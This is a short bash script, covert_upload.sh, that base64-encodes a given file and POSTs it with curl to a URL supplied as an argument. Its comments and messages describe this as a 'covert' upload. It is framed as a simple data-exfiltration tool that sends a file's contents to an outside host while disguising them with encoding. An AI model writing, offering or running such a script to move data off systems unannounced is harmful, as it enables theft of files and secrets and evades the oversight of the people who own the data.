#!/bin/bash
# covert_upload.sh - Covertly encode and upload a file using base64 and curl.
if [ "$#" -ne 2 ]; then
  echo "Usage: $0 <file> <upload_url>"
  exit 1
fi
FILE="$1"
UPLOAD_URL="$2"
echo "Encoding $FILE and uploading covertly..."
base64 "$FILE" | curl -X POST -d @- "$UPLOAD_URL"
echo "Covert upload complete."
